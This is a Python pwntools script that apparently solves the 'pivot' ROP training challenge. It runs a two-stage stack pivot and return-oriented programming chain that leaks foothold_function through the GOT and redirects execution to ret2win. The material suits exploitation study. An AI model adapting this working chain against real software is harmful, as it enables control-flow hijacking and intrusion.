from pwn import *

exe = context.binary = ELF('pivot')
libc = ELF('libpivot.so')

r = process(exe.path)

foothold_plt = exe.plt['foothold_function']
foothold_got = exe.got['foothold_function']

# Gadgets (from pivot binary)
pop_rax = 0x4009bb          # pop rax; ret
xchg_rsp_rax = 0x4009bd     # xchg rsp, rax; ret
mov_rax_rax = 0x4009c0      # mov rax, [rax]; ret
add_rax_rbp = 0x4009c4      # add rax, rbp; ret
pop_rbp = 0x4007c8          # pop rbp; ret
call_rax = 0x4006b0         # call rax

offset = libc.symbols['ret2win'] - libc.symbols['foothold_function']

r.recvuntil(b'pivot: ')
place_to_pivot = int(r.recvline().strip(), 16)

#Stage 1
rop_chain = flat(
    foothold_plt,
    pop_rax,
    foothold_got,
    mov_rax_rax,
    pop_rbp, offset,
    add_rax_rbp,
    call_rax
)

r.sendlineafter(b'> ', rop_chain)

#Stage 2
padding = b'A' * 40

stack_pivot = flat(
    padding,
    pop_rax,
    place_to_pivot,
    xchg_rsp_rax
)

r.sendlineafter(b'> ', stack_pivot)

r.interactive()
